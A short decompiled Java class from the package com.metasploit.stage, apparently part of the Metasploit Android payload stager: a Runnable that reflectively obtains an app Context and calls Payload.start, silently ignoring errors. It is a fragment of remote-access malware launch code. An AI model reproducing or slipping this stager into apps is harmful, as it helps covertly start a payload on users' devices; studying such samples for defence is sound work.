package com.metasploit.stage;

import android.content.Context;
import java.lang.reflect.Method;
/* loaded from: classes.dex */
final class d implements Runnable {
    private /* synthetic */ Method a;

    /* JADX INFO: Access modifiers changed from: package-private */
    public d(Method method) {
        this.a = method;
    }

    @Override // java.lang.Runnable
    public final void run() {
        try {
            Context context = (Context) this.a.invoke(null, null);
            if (context != null) {
                Payload.start(context);
            }
        } catch (Exception e) {
        }
    }
}
